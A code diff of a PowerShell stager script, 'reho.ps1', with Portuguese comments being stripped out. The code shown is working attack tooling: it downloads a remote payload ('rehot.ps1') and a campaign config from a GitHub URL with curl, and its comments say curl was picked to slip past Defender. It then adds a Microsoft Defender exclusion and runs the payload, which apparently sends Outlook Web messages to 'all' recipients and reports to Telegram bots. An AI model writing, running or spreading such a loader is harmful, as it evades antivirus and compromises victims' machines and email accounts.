@@ -1,14 +1,3 @@
-# reho.ps1 v4 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
-# O que muda aqui NUNCA quebra o one-liner: a campanha mora em reho.config.json
-# (versionado, baixado junto com rehot.ps1). Este runner e 100% fixo:
-#   1. cria %LOCALAPPDATA%\rehot
-#   2. baixa rehot.ps1 + reho.config.json (2 engines por arquivo: iwr -> curl fallback;
-#      canary em cada arquivo; config ausente/ilegivel cai em default sem abortar)
-#   3. unblock + exclusao do Defender (a exclusao so aplica em shell admin; sem admin segue sem ela)
-#   4. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
-# Diagnostico: linhas [reho ...]; FALHA sai motivo + exit code do estagio (1..9).
-# Nao existe segredo neste script: tokens do bot moram no rehot.config.json local (gitignored).
-
 $ErrorActionPreference = 'Stop'
 $base = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main'
 $d = Join-Path $env:LOCALAPPDATA 'rehot'
@@ -34,8 +23,6 @@ foreach ($old in @($t, $c)) {
 }
 
 function Get-Dl([string]$name, [string]$dest) {
-    # engine 1: curl.exe nativo (TLS do Windows; mais discreto que iwr - o iex/irm do
-    # uml era o que o Defender acusava; aqui e no uml curl e o motor principal)
     try {
         $tmp = $dest + '.dl'
         & curl.exe -sSL -f --connect-timeout 30 -o $tmp ($base + '/' + $name) 2>$null
@@ -43,9 +30,6 @@ function Get-Dl([string]$name, [string]$dest) {
         if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
         if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
     } catch { }
-    # (iwr ja foi o engine 1 na v4.0; agora e fallback - apenas se o alvo nao tem curl.exe)
-    # So avanca se a chamada nao lancar E arquivo existe com tamanho > 0
-    # (arquivo parcial de um iwr cortado NUNCA avanca).
     try {
         Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
         if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
@@ -59,8 +43,6 @@ if (-not (Get-Dl 'rehot.ps1' $t)) {
 if (-not ((Get-Content $t -Raw).Contains('Send-OWAMsg'))) {
     RhoFail 2 'canary rehot.ps1 ausente: payload baixado nao e o rehot esperado (resposta de erro ou repo divergente)'
 }
-# guard anti-truncamento: canary presente nao prova script inteiro (download cortado
-# pode conter o canary e morrer no meio do corpo). Parse completo antes de executar.
 $toks = $null; $perr = $null
 [void][System.Management.Automation.Language.Parser]::ParseInput((Get-Content $t -Raw), [ref]$toks, [ref]$perr)
 if ($null -ne $perr -and $perr.Count -gt 0) {
@@ -83,7 +65,6 @@ try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
 try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
 Write-Output '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'
 
-# defaults (fallback quando reho.config.json nao existe; mesmo contrato de campanha de v3)
 $dv = @{
     recipients     = 'all'
     close_browsers = $true
@@ -152,7 +133,6 @@ if ($TelegramChatId) { $argvs += '-TelegramChatId', $TelegramChatId }
 if ($ListaTok) { $argvs += '-ListaTok', $ListaTok }
 if ($ListaChatId) { $argvs += '-ListaChatId', $ListaChatId }
 
-# log do estagio-4 com tokens mascarados (nao deixa segredo no console/alvo)
 $argvsLog = $argvs
 if ($TgTok) { $argvsLog = $argvs -replace [regex]::Escape($TgTok), '***' }
 if ($ListaTok) { $argvsLog = $argvsLog -replace [regex]::Escape($ListaTok), '***' }
